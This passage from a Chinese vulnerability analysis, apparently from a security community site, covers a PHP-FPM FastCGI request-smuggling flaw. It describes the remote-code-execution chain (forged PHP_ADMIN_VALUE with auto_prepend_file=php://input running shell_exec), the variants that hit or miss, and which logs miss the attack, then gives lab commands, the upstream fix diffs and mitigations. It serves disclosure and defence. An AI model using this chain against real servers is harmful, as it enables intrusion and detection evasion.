POST，<code>Content-Length</code> 对得上</p></td><td colspan=\"1\" rowspan=\"1\"><p>没有理由拒绝</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>解析器告警</p></td><td colspan=\"1\" rowspan=\"1\"><p><code>Mime headers garbled</code> 是可恢复告警</p></td><td colspan=\"1\" rowspan=\"1\"><p>请求继续执行，连接不断</p></td></tr></tbody></table><p><code>plain.php</code>/<code>noopen.php</code> 不打开 <code>php://input</code>，<code>request_body</code> 为空，<code>post_read=0</code>，drain 会执行，所以不命中；<code>open.php</code>/<code>read1.php</code> 打开但不读完，命中。</p><h3 id=\"sec-21\">3、关键轮次或关键状态</h3><table><tbody><tr><td colspan=\"1\" rowspan=\"1\"><p>轮次</p></td><td colspan=\"1\" rowspan=\"1\"><p>发生了什么</p></td><td colspan=\"1\" rowspan=\"1\"><p>关键状态</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>解析</p></td><td colspan=\"1\" rowspan=\"1\"><p>解析器读到 5120，报 <code>Mime headers garbled</code>，停止</p></td><td colspan=\"1\" rowspan=\"1\"><p><code>read_post_bytes</code> 约 5120，连接上还剩 6880 字节</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>关闭</p></td><td colspan=\"1\" rowspan=\"1\"><p>打开过 <code>php://input</code> 就跳过 drain；没打开就执行 drain</p></td><td colspan=\"1\" rowspan=\"1\"><p><code>request_body</code> 是否非空，<code>post_read</code> 是否为 0</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>复用</p></td><td colspan=\"1\" rowspan=\"1\"><p>FPM 清空 <code>in_len</code>，把残留读成新请求</p></td><td colspan=\"1\" rowspan=\"1\"><p><code>SCRIPT_FILENAME</code>、<code>REMOTE_ADDR</code>、<code>PHP_ADMIN_VALUE</code> 由伪造记录提供</p></td></tr></tbody></table><p>关键状态是 <code>request_body</code> 和 <code>post_read</code>：前者决定走哪条 drain 分支，后者决定没打开 <code>php://input</code> 时 drain 是否执行。</p><h3 id=\"sec-22\">4、落点为什么在那里</h3><p>hidden 请求的 <code>SCRIPT_FILENAME</code> 指向 <code>/var/www/html/open.php</code>；FPM 只认 <code>SCRIPT_FILENAME</code>，不要求它和 <code>REQUEST_URI</code> 一致。<code>PHP_ADMIN_VALUE</code> 里的 <code>allow_url_include=1</code> 和 <code>auto_prepend_file=php://input</code> 让 hidden 请求的 STDIN 在脚本前执行，<code>shell_exec('id')</code> 的结果写进 <code>/tmp/rce.txt</code>。</p><p>落点选 <code>/tmp</code>，因为官方镜像的 worker 用户是 <code>www-data</code>，<code>/tmp</code> 是 1777。应用的临时、上传、日志目录如果对 worker 可写，也可以作为落点；<code>open_basedir</code> 会限制可选路径。RCE 的身份边界是 worker，不是 root。</p><h3 id=\"sec-23\">5、不开调试或日志时为什么看不到</h3><table><tbody><tr><td colspan=\"1\" rowspan=\"1\"><p>位置</p></td><td colspan=\"1\" rowspan=\"1\"><p>看到什么</p></td><td colspan=\"1\" rowspan=\"1\"><p>注意</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>nginx access log</p></td><td colspan=\"1\" rowspan=\"1\"><p>一条 <code>POST /open.php</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>hidden 请求不是 HTTP 请求，不会单独记</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>Apache</p></td><td colspan=\"1\" rowspan=\"1\"><p>下一次复用连接报 <code>AH01069: Got bogus rid 2, expected 1</code>，返回 503</p></td><td colspan=\"1\" rowspan=\"1\"><p>上一次 hidden 已执行；下一次请求被挡住</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>FPM access log</p></td><td colspan=\"1\" rowspan=\"1\"><p><code>POST /outer.php</code> 和 <code>GET /h.php</code> 两行</p></td><td colspan=\"1\" rowspan=\"1\"><p><code>%R</code> 是 TCP 对端，不是伪造的 <code>REMOTE_ADDR</code></p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>应用日志</p></td><td colspan=\"1\" rowspan=\"1\"><p><code>REMOTE_ADDR=203.0.113.1</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>与 FPM <code>%R</code> 对不上</p></td></tr></tbody></table><p><code>File Upload Mime headers garbled</code> 在漏洞版和修复版都会出现，它不是命中标志。真正能证明命中的是第二个请求的副作用：文件、数据库、外连、FPM access log 的第二行，或者应用日志里的伪造 <code>REMOTE_ADDR</code>。</p><h3 id=\"sec-24\">6、同一路径的另一种写法</h3><table><tbody><tr><td colspan=\"1\" rowspan=\"1\"><p>变体</p></td><td colspan=\"1\" rowspan=\"1\"><p>结果</p></td><td colspan=\"1\" rowspan=\"1\"><p>说明</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>multipart，keep on，hidden 在 5120</p></td><td colspan=\"1\" rowspan=\"1\"><p>命中</p></td><td colspan=\"1\" rowspan=\"1\"><p>两个响应：<code>outer</code> + <code>smuggled</code></p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>multipart，keep off</p></td><td colspan=\"1\" rowspan=\"1\"><p>未命中</p></td><td colspan=\"1\" rowspan=\"1\"><p>连接关闭，残留丢弃</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>hidden 偏移不是 5120</p></td><td colspan=\"1\" rowspan=\"1\"><p>未命中</p></td><td colspan=\"1\" rowspan=\"1\"><p>只有第一个 5120 填充边界成立</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>partial 记录，keep on</p></td><td colspan=\"1\" rowspan=\"1\"><p>命中</p></td><td colspan=\"1\" rowspan=\"1\"><p><code>CONTENT_LENGTH=1</code>，hidden 在长度外</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>外请求打开但不读</p></td><td colspan=\"1\" rowspan=\"1\"><p>命中</p></td><td colspan=\"1\" rowspan=\"1\"><p><code>request_body</code> 非空，跳过 drain</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>外请求读完 / 不打开</p></td><td colspan=\"1\" rowspan=\"1\"><p>未命中</p></td><td colspan=\"1\" rowspan=\"1\"><p>读完没有剩余；不打开则 drain 清掉</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>nginx / Apache 复用</p></td><td colspan=\"1\" rowspan=\"1\"><p>命中</p></td><td colspan=\"1\" rowspan=\"1\"><p>响应被吞或下一次 503，副作用在</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>8.4.28 修复版</p></td><td colspan=\"1\" rowspan=\"1\"><p>未命中</p></td><td colspan=\"1\" rowspan=\"1\"><p>没有第二个请求</p></td></tr></tbody></table><h2 id=\"sec-25\">六、修复建议</h2><p>修复在 PHP <code>8.2.36</code>、<code>8.3.37</code>、<code>8.4.28</code>、<code>8.5.13</code>。提交 <code>c7a30157f6593f6e97fa2ebcec2df9ba2c2c4bff</code> 做了两处修改，并附带两个回归测试：</p><ul><li><p><code>main/SAPI.c</code>：只要 <code>!SG(post_read)</code> 就 drain，不再因为 <code>request_body</code> 存在而跳过。</p></li><li><p><code>main/fastcgi.c</code>：<code>fcgi_read_request()</code> 发现 <code>req-&gt;in_len != 0</code> 时拒绝新请求；<code>fcgi_close()</code> 把 <code>req-&gt;in_len</code> 清零，避免半条 STDIN 记录污染后续连接。</p></li></ul><p><code>request_body</code> 非空时旧代码直接跳过 drain；修复把 <code>request_body</code> 短路拆开，<code>!SG(post_read)</code> 时 drain 会执行（multipart 解析器读 body 时 <code>post_read</code> 仍是 0），<code>fcgi_read_request()</code> 的 <code>in_len != 0</code> 再拒绝部分读取的新请求。</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001527-43099a4a-e822-1.svg&amp;mode=full&amp;exp=1796169600&amp;sig=418a49a6804d489e\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001527-43099a4a-e822-1.svg&amp;mode=thumb&amp;exp=1796169600&amp;sig=290dc6efd063b2d1 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001527-43099a4a-e822-1.svg&amp;mode=image-1200&amp;exp=1796169600&amp;sig=56a98e9ace1a5136 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001527-43099a4a-e822-1.svg&amp;mode=full&amp;exp=1796169600&amp;sig=418a49a6804d489e 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"1293\"></p><h3 id=\"sec-26\">2、关键那一行或那一处</h3><p><code>main/SAPI.c</code> 把 <code>else if</code> 拆成独立的 <code>if</code>，让 drain 不再依赖 <code>request_body</code>：</p><pre><code>-\t} else if (SG(server_context)) {\n+\t}\n+\tif (SG(server_context)) {</code></pre><p><code>main/fastcgi.c</code> 在 <code>fcgi_read_request()</code> 开头加了残留检查：</p><pre><code>+\tif (UNEXPECTED(req-&gt;in_len != 0)) {\n+\t\treturn 0;\n+\t}</code></pre><p><code>fcgi_close()</code> 里补了清零，避免一个只读了一半的 STDIN 记录在连接关闭后还留着计数：</p><pre><code>         req-&gt;fd = -1;\n+\t\t/* a partially read STDIN record does not outlive its connection */\n+\t\treq-&gt;in_len = 0;</code></pre><h3 id=\"sec-27\">3、修复之后测试</h3><p>直连修复版 FPM，两个关键测试：</p><pre><code>python3 /opt/phpfpm-smuggle-lab/fcgi_client.py --port 9001 --mode multipart --keep on\npython3 /opt/phpfpm-smuggle-lab/fcgi_client.py --port 9001 --mode rce --keep on</code></pre><p>检查副作用文件：</p><pre><code>ls -la /tmp/rce.txt /tmp/smuggled.txt 2&gt;/dev/null || echo fixed-no-files</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261125001528-4359b83e-e822-1.png&amp;mode=full&amp;exp=1796169600&amp;sig=07d48b5f6104db4b\" loading=\"lazy\" decoding=\"async\" width=\"1388.7987088240516\" height=\"278\"></p><p>partial 会返回 <code>outer 1</code> 后连接重置，新连接仍能正常服务；nginx <code>/fixed/open.php</code> 同样 <code>http=200</code>、<code>fixed-no-files</code>，漏洞版 <code>/open.php</code> 在 4.5 已写入 <code>uid=33(www-data)</code>。</p><p>上游 <code>--EXPECT--</code>：<code>keep off: safe</code>、<code>keep on: safe</code>、<code>partial frame: safe</code>。</p><h3 id=\"sec-28\">4、拿不到补丁时的调用侧处理</h3><p>最直接的缓解是关掉后端连接复用。nginx 的 <code>fastcgi_keep_conn</code> 默认是 <code>off</code>，确认没有显式打开；Apache 的 <code>mod_proxy_fcgi</code> 用 <code>enablereuse=off</code>；HAProxy 不保留 FastCGI 后端连接；LSAPI 同样按请求关闭。这个缓解在 8.4.27 上实测有效：nginx 的 <code>keep on</code> 命中、<code>keep off</code> 只剩 <code>outer</code>；Apache 2.4.71 的 <code>enablereuse=on</code> 命中、<code>enablereuse=off</code> 无副作用文件。</p><p>不要把 FPM 的 9000 端口直接暴露给不可信网络。<code>listen.allowed_clients</code>、防火墙、只监听 Unix socket，都能把“攻击者直接对 FPM 说 FastCGI”的路径关掉；但前端复用连接时，攻击者不需要直接访问 FPM，所以这条是补充，不是替代。</p><p>如果必须保留 keep-conn，只能更新 PHP。靠 WAF 匹配 5120 处的 FastCGI 魔数不可靠：偏移、body 长度、partial 记录都能改；<code>fastcgi_request_buffering</code> 也不解决，nginx 仍然会把 body 完整转给 FPM。<code>open_basedir</code>、<code>disable_functions</code> 能压缩 RCE 的落点，但挡不住 hidden 请求本身。</p><h2 id=\"sec-29\">参考链接</h2><ul><li><p>修复提交：<a href=\"https://github.com/php/php-src/commit/c7a30157f6593f6e97fa2ebcec2df9ba2c2c4bff\">https://github.com/php/php-src/commit/c7a30157f6593f6e97fa2ebcec2df9ba2c2c4bff</a></p></li><li><p>回归测试 <code>unread-body-keep-conn.phpt</code>：<a href=\"https://github.com/php/php-src/blob/c7a30157f6593f6e97fa2ebcec2df9ba2c2c4bff/sapi/fpm/tests/unread-body-keep-conn.phpt\">https://github.com/php/php-src/blob/c7a30157f6593f6e97fa2ebcec2df9ba2c2c4bff/sapi/fpm/tests/unread-body-keep-conn.phpt</a></p></li><li><p>回归测试 <code>unread-body-partial-record.phpt</code>：<a href=\"https://github.com/php/php-src/blob/c7a30157f6593f6e97fa2ebcec2df9ba2c2c4bff/sapi/fpm/tests/unread-body-partial-record.phpt\">https://github.com/php/php-src/blob/c7a30157f6593f6e97fa2ebcec2df9ba2c2c4bff/sapi/fpm/tests/unread-body-partial-record.phpt</a></p></li><li><p>CVE 记录：<a href=\"https://www.cve.org/CVERecord?id=CVE-2026-129289\">https://www.cve.org/CVERecord?id=CVE-2026-129289</a></p></li><li><p>厂商公告 GHSA-qc49-hpvq-g2w6：<a href=\"https://github.com/php/php-src/security/advisories/GHSA-qc49-hpvq-g2w6\">https://github.com/php/php-src/security/advisories/GHSA-qc49-hpvq-g2w6</a></p></li><li><p>受影响源码 <code>main/rfc1867.c</code>：<a href=\"https://github.com/php/php-src/blob/php-8.4.27/main/rfc1867.c#L187\">https://github.com/php/php-src/blob/php-8.4.27/main/rfc1867.c#L187</a></p></li><li><p>受影响源码 <code>main/SAPI.c</code>：<a href=\"https://github.com/php/php-src/blob/php-8.4.27/main/SAPI.c#L501\">https://github.com/php/php-src/blob/php-8.4.27/main/SAPI.c#L501</a></p></li><li><p>受影响源码 <code>main/fastcgi.c</code>：<a href=\"https://github.com/php/php-src/blob/php-8.4.27/main/fastcgi.c#L1036\">https://github.com/php/php-src/blob/php-8.4.27/main/fastcgi.c#L1036</a></p></li><li><p>阿里云漏洞库条目：<a href=\"https://avd.aliyun.com/detail?id=AVD-2026-129289\">https://avd.aliyun.com/detail?id=AVD-2026-129289</a></p></li><li><p>公开检索（截至 2026-11-20，官方未附 PoC）：<a href=\"https://github.com/search?q=CVE-2026-129289&amp;type=repositories\">https://github.com/search?q=CVE-2026-129289&amp;type=repositories</a></p></li></ul>","original","zhKind","complete","漏洞","复现","漏洞分析","利用链","PHP","https://xz.aliyun.com/news/93458","先知社区",{"_183":184,"_185":-5},"changelogVersion","2026-10-01T08:00","release"]
